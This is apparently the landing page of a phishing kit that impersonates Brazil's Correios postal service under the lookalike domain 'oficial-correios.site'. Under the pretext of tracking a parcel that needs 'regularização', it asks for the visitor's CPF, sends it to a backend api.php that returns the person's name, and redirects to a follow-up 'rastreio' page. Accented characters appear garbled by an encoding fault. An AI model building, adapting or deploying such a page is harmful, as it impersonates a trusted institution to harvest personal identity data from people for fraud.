<html lang="pt-BR"><head>
    <title>游릭 CORREIO - ENTRAR - C칩pia</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <link rel="icon" href="images/default.ico">
    <link rel="apple-touch-icon" href="images/default.ico">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <meta name="robots" content="all">
    <meta property="og:locale" content="pt_BR">
    <meta property="og:type" content="article">
    <meta property="og:title" content="CORREIOS - OFICIAL">
    <meta property="og:description" content="Regulariza칞칚o de encomenda">
    <meta property="og:site_name" content="CORREIOS OFICIAL">
    <meta property="og:url" content="https://www.oficial-correios.site/entrando">
    <link rel="stylesheet" href="css/style.css">
    <link rel="dns-prefetch preconnect" href="https://fonts.googleapis.com" crossorigin="">
    <link rel="dns-prefetch preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,400;0,700;1,400;1,700&family=Open+Sans:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet" media="all">
</head>

<body class="">
    <div id="site">
        <div id="b_1248129_1_17370464156789398f2bf7e" class="gpc-b ">
            <div class="gpc-b_sobreposicao"></div>
            <div class="centralizar">
                <div id="e_1248129_1_17370464156789398f2bf9e102374210" class="gpc-e e_texto dd dm e_1248129_1_17370464156789398f2bf9e102374210" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><b>Rastreamento</b></span></p>
                    </div>
                </div>
                <div id="e_1248129_1_17370464156789398f2c2c5633610212" class="gpc-e e_caixa dd dm e_1248129_1_17370464156789398f2c2c5633610212">
                    <div class="c borda_igual e_caixa"></div>
                </div>
                <div id="e_1248129_1_17370464156789398f2c326419756588" class="gpc-e e_texto dd dm e_1248129_1_17370464156789398f2c326419756588">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><b>ACOMPANHE SUAS ENCOMENDAS ABAIXO</b></p>
                    </div>
                </div>
                <div id="e_1248129_1_17370464156789398f2c378980206316" class="gpc-e e_texto dd dm e_1248129_1_17370464156789398f2c378980206316" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span>Deseja acompanhar seu objeto?<br>Digite o CPF do comprador</span></p>
                    </div>
                </div>
                <div id="e_1248129_1_17370464156789398f2c3d5890029603" class="gpc-e e_formulario dd dm e_1248129_1_17370464156789398f2c3d5890029603" style="white-space: normal;">
                    <form class="c e_formulario" id="86a1c069-1635-8c99-4afd-36afc50ead32" style="white-space: normal;">
                        <fieldset>
                            <div class="gpc_campos gpc_campos-input gpc_campos-100">
                                <div class="gpc_campos-titulo esconder">
                                    <label for="input_1734416045"><span><em>*</em>cpf: 000.000.000-00</span><span class="gpc_campos-titulo_descricao icone-informacao gtt-baixo esconder" data-gtt=""></span></label>
                                </div>
                                <div class="gpc_campos-campo"><input id="input_1734416045" name="cpf-000000000-00" type="text" placeholder="* cpf: 000.000.000-00" class="gpc_campo  cpf obrigatorio" value="">
                                    <div class="gpc_campos-erro icone_bold-aviso gtt-esquerda" data-gtt=""></div>
                                </div>
                                <div class="gpc_campos-texto"></div>
                            </div>
                        </fieldset>
                        <button class="gpc_botao borda_igual e_formulario"><span>Consultar</span></button>
                    </form>
                </div>
                <div id="e_1248129_1_17370464156789398f32122587196927" class="gpc-e e_imagem dd dm e_1248129_1_17370464156789398f32122587196927" style="white-space: normal;">
                    <div class="c imagem e_imagem" style="white-space: normal;">
                        <div class="imagem_fundo"></div>
                    </div>
                </div>
                <div id="e_1248129_1_17370464156789398f32262597684658" class="gpc-e e_imagem dd dm e_1248129_1_17370464156789398f32262597684658" style="white-space: normal;">
                    <div class="c imagem e_imagem" style="white-space: normal;">
                        <div class="imagem_fundo"></div>
                    </div>
                </div>
                <div id="e_1248129_1_17370464156789398f3234a507668651" class="gpc-e e_titulo dd dm e_1248129_1_17370464156789398f3234a507668651" style="white-space: normal;">
                    <div class="c e_titulo" style="white-space: normal;">
                        <h2><span>Portal Correios </span><span>> </span><span>Rastreamento </span></h2>
                    </div>
                </div>
                <div id="e_1248129_1_17370464156789398f3240e670180056" class="gpc-e e_texto dd dm e_1248129_1_17370464156789398f3240e670180056" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><span><b>Aten칞칚o:</b> Digite seu CPF sem pontos e tra칞os (apenas n칰meros)</span></p>
                    </div>
                </div>
                <div id="e_1248129_1_17370464156789398f32469548758122" class="gpc-e e_texto dd dm e_1248129_1_17370464156789398f32469548758122 error" style="white-space: normal;">
                    <div class="c e_texto" style="white-space: normal;">
                        <p><b class="textoerror">CPF</b></p>
                    </div>
                </div>
            </div>
        </div>
        <div id="b_1248129_1_17370464156789398f2bf98" class="gpc-b">
            <div class="gpc-b_sobreposicao"></div>
        </div>
    </div>

    <style>
        .obrigatorio.active {
            border: 1px solid red !important;
        }

        .error {
            width: auto !important;
        }

        .error.active {
            width: auto !important;
        }

        .textoerror.active {
            color: red !important;
        }
    </style>

<script>
document.addEventListener("DOMContentLoaded", () => {
  "use strict";

  const form = document.querySelector("form.e_formulario");
  const inputCPF = document.getElementById("input_1734416045");
  const btnConsultar = form?.querySelector("button");
  const errorDiv = form?.querySelector(".gpc_campos-erro");
  const textoErrorDiv = document.querySelector(".textoerror");

  // M치scara de CPF
  inputCPF.addEventListener("input", (e) => {
    let v = e.target.value.replace(/\D/g, "");
    if (v.length > 3) v = v.replace(/(\d{3})(\d)/, "$1.$2");
    if (v.length > 7) v = v.replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3");
    if (v.length > 11) v = v.replace(/(\d{3})\.(\d{3})\.(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
    e.target.value = v;
  });

  const isValidCPF = (cpf) => cpf.replace(/\D/g, "").length === 11;

  const showError = (msg) => {
    inputCPF.classList.add("obrigatorio", "active");
    errorDiv?.classList.add("error", "active");
    if (textoErrorDiv) {
      textoErrorDiv.classList.add("textoerror", "active");
      textoErrorDiv.textContent = msg || "Erro desconhecido.";
    }
  };

  const clearError = () => {
    inputCPF.classList.remove("obrigatorio", "active");
    errorDiv?.classList.remove("error", "active");
    textoErrorDiv?.classList.remove("active");
  };

  btnConsultar.addEventListener("click", async (e) => {
    e.preventDefault();

    const cpf = inputCPF.value.replace(/\D/g, "");
    clearError();

    if (!isValidCPF(cpf)) {
      showError("CPF precisa ter 11 d칤gitos!");
      return;
    }

    const prevTxt = btnConsultar.textContent;
    btnConsultar.disabled = true;
    btnConsultar.textContent = "Consultando...";

    try {
      // GET (compat칤vel mesmo se o host bloquear POST)
      const url = `api.php?cpf=${encodeURIComponent(cpf)}&t=${Date.now()}`;
      const response = await fetch(url, { method: "GET", cache: "no-store" });

      const raw = await response.text();
      let data = null;
      try { data = JSON.parse(raw); } catch {}

      if (!response.ok) {
        const msg = (data && (data.error || data.message)) || raw || `HTTP ${response.status}`;
        throw new Error(String(msg).slice(0, 500));
      }

      if (!data || typeof data !== "object") {
        throw new Error((raw && raw.slice(0, 500)) || "Resposta inv치lida da API");
      }

      // Backend padronizado: { ok: true, cpf, nome, data: {...} }
      if (!data.ok) {
        throw new Error(data.error || "Falha na consulta");
      }

      // opcional: guardar a resposta para usar na pr칩xima p치gina
      try { sessionStorage.setItem("consultaCPF", JSON.stringify(data)); } catch {}

      const currentParams = new URLSearchParams(window.location.search);
      currentParams.set("cpf", String(data.cpf || cpf));
      window.location.href = `rastreio?${currentParams.toString()}`;
    } catch (err) {
      console.error(err);
      showError(err?.message || "Erro ao validar CPF!");
    } finally {
      btnConsultar.disabled = false;
      btnConsultar.textContent = prevTxt;
    }
  });
});
</script>

    




</body></html>
